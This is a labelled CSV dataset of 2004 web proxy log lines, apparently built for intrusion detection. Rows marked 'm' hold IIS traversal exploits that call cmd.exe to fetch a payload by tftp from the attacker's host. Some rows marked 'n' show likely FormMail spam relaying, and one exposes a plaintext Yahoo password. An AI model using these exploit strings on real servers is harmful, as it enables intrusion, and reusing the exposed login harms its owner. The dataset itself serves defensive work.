rowIndex, row, class
7542, 61.237.215.17 - - [10/Mar/2004:11:44:48 -0500] "GET http://eyesontheworldwideweb.com/search.php?ID=44&fString=Food+%26+Wine HTTP/1.0" 302 0 "http://www.linkou.con.cn" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
7543, 68.82.168.149 - - [10/Mar/2004:11:44:50 -0500] "GET http://www.screamandcream.com/members/ HTTP/1.0" 200 566 "http://www.screamandcream.com/members/" "Mozilla/4.7 ( compatible; MSIE 4.0; Windows NT4.0; DigiExt )", n
7544, 67.83.151.132 - - [10/Mar/2004:11:44:52 -0500] "POST http://www.bonefishadventure.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
7545, 61.237.215.17 - - [10/Mar/2004:11:44:52 -0500] "GET http://eyesontheworldwideweb.com/search_results.php?fSearch_id=cf22cae7ca8cad5c&fString=food+%26+wine HTTP/1.0" 200 5882 "http://www.linkou.con.cn" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
7546, 61.237.215.17 - - [10/Mar/2004:11:44:53 -0500] "GET http://eyesontheworldwideweb.com/redirect.php?fID=7647768 HTTP/1.0" 302 0 "http://eyesontheworldwideweb.com/search_results.php?fSearch_id=cf22cae7ca8cad5c&fString=food+%26+wine" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
7547, 203.121.182.141 - - [10/Mar/2004:11:44:54 -0500] "CONNECT 210.242.13.80:25 HTTP/1.0" 200 - "-" "-", n
7548, 61.237.215.17 - - [10/Mar/2004:11:44:54 -0500] "GET http://www.xuppa.com/cgi-local/click.cgi?o=roy123&k=Food+&+Wine&partnerid=trocadeiroSE&c=_b9pt_&pro=1&srch=Food+&+Wine&pos=1 HTTP/1.0" 302 426 "http://eyesontheworldwideweb.com/search_results.php?fSearch_id=cf22cae7ca8cad5c&fString=food+%26+wine" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
7549, 68.48.36.59 - - [10/Mar/2004:11:44:55 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7550, 68.48.142.117 - - [10/Mar/2004:11:44:57 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
7551, 61.237.215.17 - - [10/Mar/2004:11:45:00 -0500] "GET http://msxml.us.info.com/infocom.us/results?otmpl=dog%2Fwebresults.htm&ran=7495&qk=10&top=1&qkw=Food+&qcat=web&qo=us&CMP=KNC-VI9397575996&infoad=1 HTTP/1.0" 200 42471 "http://eyesontheworldwideweb.com/search_results.php?fSearch_id=cf22cae7ca8cad5c&fString=food+%26+wine" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
7552, 68.119.119.16 - - [10/Mar/2004:11:45:05 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.119.119.16%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7553, 67.83.151.132 - - [10/Mar/2004:11:45:11 -0500] "POST http://www.sleepeducationandresearch.com/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
7554, 68.48.142.117 - - [10/Mar/2004:11:45:14 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7555, 68.48.36.59 - - [10/Mar/2004:11:45:46 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7556, 68.82.168.149 - - [10/Mar/2004:11:45:46 -0500] "GET http://www.screamandcream.com/members/ HTTP/1.0" 200 566 "http://www.screamandcream.com/members/" "Mozilla/4.6 ( compatible; [jp]; Windows 95; DigiExt )", n
7557, 192.117.242.67 - - [10/Mar/2004:11:45:47 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
7558, 195.16.40.200 - - [10/Mar/2004:11:45:47 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
7559, 68.48.142.117 - - [10/Mar/2004:11:45:48 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7560, 68.82.168.149 - - [10/Mar/2004:11:45:51 -0500] "GET http://www.screamandcream.com/members/ HTTP/1.0" 200 566 "http://www.screamandcream.com/members/" "Mozilla/4.73 ( compatible; MSIE 5.0; Windows 95; DigiExt )", n
7561, 24.168.72.174 - - [10/Mar/2004:11:45:51 -0500] "GET http://login.europe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus1717&passwd=father HTTP/1.0" 200 566 "-" "-", n
7562, 68.119.119.16 - - [10/Mar/2004:11:45:56 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.119.119.16%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7563, 68.48.142.117 - - [10/Mar/2004:11:46:05 -0500] "GET /scripts/..%252f../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7564, 67.83.151.132 - - [10/Mar/2004:11:46:22 -0500] "POST http://www.probiohealth.com/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
7565, 68.189.213.50 - - [10/Mar/2004:11:46:25 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.6 ( compatible; [fr]; Windows XP; DigiExt )", n
7566, 68.189.213.50 - - [10/Mar/2004:11:46:25 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.6 ( compatible; [dk]; Windows NT5.0; ezn IE )", n
7567, 68.189.213.50 - - [10/Mar/2004:11:46:25 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.73 ( compatible; MSIE 5.01; Windows NT5.0; DigiExt )", n
7568, 68.189.213.50 - - [10/Mar/2004:11:46:25 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.0 ( compatible; MSIE 4.0; Windows 95; DigiExt )", n
7569, 68.189.213.50 - - [10/Mar/2004:11:46:25 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.73 ( compatible; [jp]; Windows XP; athome020 )", n
7570, 68.189.213.50 - - [10/Mar/2004:11:46:25 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.0 ( compatible; MSIE 4.0; Windows XP; DigiExt )", n
7571, 68.189.213.50 - - [10/Mar/2004:11:46:25 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.0 ( compatible; MSIE 5.0; Windows NT5.0; DigiExt )", n
7572, 68.189.213.50 - - [10/Mar/2004:11:46:26 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.0 ( compatible; MSIE 5.5; Windows NT4.0; DigiExt )", n
7573, 68.189.213.50 - - [10/Mar/2004:11:46:26 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/5.0 ( compatible; [dk]; Windows XP; DigiExt )", n
7574, 68.189.213.50 - - [10/Mar/2004:11:46:26 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.73 ( compatible; MSIE 4.0; Windows 98; DigiExt )", n
7575, 68.189.213.50 - - [10/Mar/2004:11:46:27 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/5.0 ( compatible; [fr]; Windows 98; DigiExt )", n
7576, 68.189.213.50 - - [10/Mar/2004:11:46:27 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/5.0 ( compatible; MSIE 4.01; Windows 98; DigiExt )", n
7577, 68.189.213.50 - - [10/Mar/2004:11:46:27 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.6 ( compatible; [fr]; Windows 98; win9x/NT 4.90 )", n
7578, 68.189.213.50 - - [10/Mar/2004:11:46:27 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.6 ( compatible; [dk]; Windows NT5.0; DigiExt )", n
7579, 68.189.213.50 - - [10/Mar/2004:11:46:28 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.0 ( compatible; MSIE 4.01; Windows 95; DigiExt )", n
7580, 68.189.213.50 - - [10/Mar/2004:11:46:28 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/5.0 ( compatible; MSIE 4.0; Windows NT4.0; FREEI v2.53 )", n
7581, 68.189.213.50 - - [10/Mar/2004:11:46:28 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.73 ( compatible; MSIE 5.0; Windows NT4.0; FREEI v2.53 )", n
7582, 68.189.213.50 - - [10/Mar/2004:11:46:29 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/3.01 ( compatible; [dk]; Windows XP; athome0107 )", n
7583, 68.189.213.50 - - [10/Mar/2004:11:46:29 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.7 ( compatible; [fr]; Windows XP; TWRAITH )", n
7584, 68.189.213.50 - - [10/Mar/2004:11:46:29 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/3.01 ( compatible; MSIE 4.01; Windows NT5.0; DigiExt )", n
7585, 68.189.213.50 - - [10/Mar/2004:11:46:29 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.73 ( compatible; [en]; Windows 98; NetCaptor )", n
7586, 68.189.213.50 - - [10/Mar/2004:11:46:29 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/3.01 ( compatible; [fr]; Windows 98; DigiExt )", n
7587, 68.189.213.50 - - [10/Mar/2004:11:46:29 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.0 ( compatible; MSIE 5.01; Windows 98; FREEI v2.53 )", n
7588, 68.189.213.50 - - [10/Mar/2004:11:46:29 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/5.0 ( compatible; MSIE 5.5; Windows 95; Compaq )", n
7589, 68.189.213.50 - - [10/Mar/2004:11:46:29 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/3.01 ( compatible; [dk]; Windows NT5.0; DigiExt )", n
7590, 68.189.213.50 - - [10/Mar/2004:11:46:29 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.0 ( compatible; MSIE 5.0; Windows 95; Compaq )", n
7591, 68.189.213.50 - - [10/Mar/2004:11:46:29 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.7 ( compatible; [dk]; Windows XP; MSNIA )", n
7592, 68.189.213.50 - - [10/Mar/2004:11:46:30 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/3.01 ( compatible; MSIE 5.01; Windows XP; DigiExt )", n
7593, 68.189.213.50 - - [10/Mar/2004:11:46:31 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/5.0 ( compatible; [de]; Windows XP; DigiExt )", n
7594, 68.189.213.50 - - [10/Mar/2004:11:46:31 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.73 ( compatible; [dk]; Windows 95; DigiExt )", n
7595, 68.189.213.50 - - [10/Mar/2004:11:46:31 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/3.01 ( compatible; MSIE 5.0; Windows 98; DigiExt )", n
7596, 68.189.213.50 - - [10/Mar/2004:11:46:31 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.7 ( compatible; [en]; Windows NT5.0; DigiExt )", n
7597, 68.189.213.50 - - [10/Mar/2004:11:46:31 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/3.01 ( compatible; [jp]; Windows NT5.0; DigiExt )", n
7598, 68.189.213.50 - - [10/Mar/2004:11:46:31 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.6 ( compatible; [de]; Windows 95; MSNIA )", n
7599, 68.189.213.50 - - [10/Mar/2004:11:46:31 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.0 ( compatible; MSIE 4.01; Windows NT4.0; DigiExt )", n
7600, 68.189.213.50 - - [10/Mar/2004:11:46:31 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.7 ( compatible; MSIE 5.5; Windows XP; DigiExt )", n
7601, 68.189.213.50 - - [10/Mar/2004:11:46:31 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.7 ( compatible; [en]; Windows 95; TWRAITH )", n
7602, 68.189.213.50 - - [10/Mar/2004:11:46:31 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/5.0 ( compatible; [en]; Windows NT4.0; FREEI v2.53 )", n
7603, 68.189.213.50 - - [10/Mar/2004:11:46:32 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/5.0 ( compatible; MSIE 4.0; Windows NT4.0; DigiExt )", n
7604, 68.189.213.50 - - [10/Mar/2004:11:46:32 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.0 ( compatible; [dk]; Windows 95; DigiExt )", n
7605, 68.48.36.59 - - [10/Mar/2004:11:46:36 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7606, 68.82.168.149 - - [10/Mar/2004:11:46:36 -0500] "GET http://www.screamandcream.com/members/ HTTP/1.0" 200 566 "http://www.screamandcream.com/members/" "Mozilla/4.6 ( compatible; [jp]; Windows 95; DigiExt )", n
7607, 68.48.36.59 - - [10/Mar/2004:11:46:37 -0500] "GET /d/httpodbc.dll HTTP/1.0" 404 282 "-" "-", m
7608, 68.48.142.117 - - [10/Mar/2004:11:46:38 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7609, 195.16.40.200 - - [10/Mar/2004:11:46:38 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
7610, 68.82.168.149 - - [10/Mar/2004:11:46:41 -0500] "GET http://www.screamandcream.com/members/ HTTP/1.0" 200 566 "http://www.screamandcream.com/members/" "Mozilla/4.73 ( compatible; MSIE 5.0; Windows 95; DigiExt )", n
7611, 67.83.151.132 - - [10/Mar/2004:11:46:45 -0500] "POST http://www.elmaz.hr/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
7612, 68.119.119.16 - - [10/Mar/2004:11:46:46 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7613, 68.119.119.16 - - [10/Mar/2004:11:46:46 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
7614, 68.119.119.16 - - [10/Mar/2004:11:46:46 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.119.119.16%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7615, 68.119.119.16 - - [10/Mar/2004:11:46:46 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.119.119.16%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7616, 68.119.119.16 - - [10/Mar/2004:11:46:47 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.119.119.16%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7617, 68.119.119.16 - - [10/Mar/2004:11:46:47 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7618, 68.119.119.16 - - [10/Mar/2004:11:46:47 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
7619, 68.119.119.16 - - [10/Mar/2004:11:46:47 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.119.119.16%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7620, 68.119.119.16 - - [10/Mar/2004:11:46:47 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.119.119.16%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7621, 68.119.119.16 - - [10/Mar/2004:11:46:47 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.119.119.16%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7622, 68.119.119.16 - - [10/Mar/2004:11:46:48 -0500] "GET /scripts/..%c1%1c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7623, 68.119.119.16 - - [10/Mar/2004:11:46:48 -0500] "GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 305 "-" "-", m
7624, 68.119.119.16 - - [10/Mar/2004:11:46:48 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
7625, 68.119.119.16 - - [10/Mar/2004:11:46:48 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.119.119.16%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7626, 68.119.119.16 - - [10/Mar/2004:11:46:48 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.119.119.16%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7627, 68.119.119.16 - - [10/Mar/2004:11:46:49 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.119.119.16%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7628, 68.119.119.16 - - [10/Mar/2004:11:46:49 -0500] "GET /scripts/..%c0%af../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7629, 68.119.119.16 - - [10/Mar/2004:11:46:49 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
7630, 68.119.119.16 - - [10/Mar/2004:11:46:49 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.119.119.16%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7631, 68.119.119.16 - - [10/Mar/2004:11:46:49 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.119.119.16%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7632, 68.119.119.16 - - [10/Mar/2004:11:46:50 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.119.119.16%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7633, 68.119.119.16 - - [10/Mar/2004:11:46:53 -0500] "GET /scripts/..%c1%9c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
7634, 68.119.119.16 - - [10/Mar/2004:11:46:53 -0500] "GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 400 289 "-" "-", m
7635, 68.82.168.149 - - [10/Mar/2004:11:46:55 -0500] "GET http://www.screamandcream.com/members/ HTTP/1.0" 200 566 "http://www.screamandcream.com/members/" "Mozilla/4.6 ( compatible; [jp]; Windows NT5.0; DigiExt )", n
7636, 68.119.119.16 - - [10/Mar/2004:11:46:56 -0500] "GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 400 289 "-" "-", m
7637, 212.160.136.163 - - [10/Mar/2004:11:47:01 -0500] "POST http://www.searchpositive.com/go.php HTTP/1.0" 200 1607 "http://www.searchpositive.com/search.php?username=bmocking&keywords=physics" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
7638, 80.103.142.186 - - [10/Mar/2004:11:47:07 -0500] "HEAD http://mamabliss.com/members/ HTTP/1.0" 200 0 "http://mamabliss.com/members/" "Mozilla/4.73 ( compatible; [dk]; Windows 95; DigiExt )", n
7639, 212.160.136.163 - - [10/Mar/2004:11:47:09 -0500] "POST http://www.searchpositive.com/go.php HTTP/1.0" 302 0 "http://www.searchpositive.com/go.php" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
7640, 212.160.136.163 - - [10/Mar/2004:11:47:11 -0500] "GET http://click.search123.com/cgi-bin/clickthru.cgi?EI=12851&Q=physics&NGT=BpD8Q87zwlqeZLbyr2W8EjaPA4t1/ZzGTU8uI+KiSxEsNujZ1dYJcUwRimMmdfbK4KfjtTpEonn2P9vS+cRkneldTjKdOsGQofGQDmhuOvn9z83wX/Dge7yCE7kdr5uZgjYXohnrwHsN3gqp8mJ2aBGsbuUyLd3ku8/D2oTkNaH4CQQxOiLzL+Nzy+qQnS097N9DXggdY7MjuZ4EYdCORm1MWc72j1kGyhKn8Znnit4V3KczTlENchDBCzkoJ3+h/Aq7SWvReIUSD/+gZIRAIg==&x=1&IP=68.81.82.194&UID=555526870&SUBAID=195 HTTP/1.0" 302 373 "http://www.searchpositive.com/go.php" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
7641, 67.83.151.132 - - [10/Mar/2004:11:47:11 -0500] "POST http://www.orpdirect.co.uk/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
7642, 212.160.136.163 - - [10/Mar/2004:11:47:12 -0500] "GET http://www.looksmart.com/og/pr=Psr;ro=5;rc=6;la=254325;lm=158976;li=102558230;ed=20040122;ii=8062.331a.404f42dd.2f43;pn=;to=;tc=6;po=5;pc=6;pi=pza3;ts=%7Chttp://www.4physics.com/?source=looksmart HTTP/1.0" 302 221 "http://www.searchpositive.com/go.php" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
7643, 68.189.213.50 - - [10/Mar/2004:11:47:15 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.6 ( compatible; [dk]; Windows NT5.0; ezn IE )", n
7644, 68.189.213.50 - - [10/Mar/2004:11:47:15 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.73 ( compatible; MSIE 5.01; Windows NT5.0; DigiExt )", n
7645, 68.189.213.50 - - [10/Mar/2004:11:47:15 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.0 ( compatible; MSIE 4.0; Windows 95; DigiExt )", n
7646, 68.189.213.50 - - [10/Mar/2004:11:47:16 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.0 ( compatible; MSIE 4.0; Windows XP; DigiExt )", n
7647, 68.189.213.50 - - [10/Mar/2004:11:47:16 -0500] "HEAD http://members.streetblowjobs.com/ HTTP/1.0" 200 0 "http://www.gamespot.com/gamespot/misc/complete/login.html" "Mozilla/4.0 ( compatible; MSIE 5.0; Windows NT5.0; DigiExt )", n
